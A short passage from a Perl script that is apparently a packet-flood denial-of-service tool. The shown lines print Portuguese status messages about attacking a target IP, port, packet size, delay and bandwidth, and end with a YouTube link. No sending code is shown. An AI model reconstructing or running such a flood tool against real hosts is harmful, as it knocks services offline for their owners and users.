...
print "Atacando $ip " . ($port ? $port : "") . "" .
  ($size ? "$size-byte" : "com pacotes de tamanho") . " aleatorios " . ($time ? " por $time seconds" : "") . "\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
print "Parar ataque, aperte Ctrl-C\n" unless $time;
print "http://www.youtube.com/showertfm\n";
